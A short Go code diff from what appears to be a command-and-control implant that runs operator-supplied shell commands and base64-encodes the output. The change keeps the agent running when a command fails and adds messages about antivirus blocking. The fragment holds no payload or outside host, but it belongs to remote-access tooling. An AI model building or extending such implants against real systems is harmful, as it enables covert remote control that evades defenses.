@@ -263,9 +263,9 @@ func main() {
 			command_id := task["CommandID"].(string)
 			shell_res, err := shell(strings.Join(command_args, " "))
 			if err != nil {
-				fmt.Println("[!] Error executing shell command")
-				fmt.Println(err)
-				return
+				fmt.Println("[!] There was an error executing the shell command, could be AV or syntax error")
+				fmt.Println("[!] Regardless, don't kill just yet.")
+				shell_res = "[Agent] There was an error executing " + command + ", check for AV or syntax errors."
 			}
 
 			result := b64_encode([]byte(shell_res))
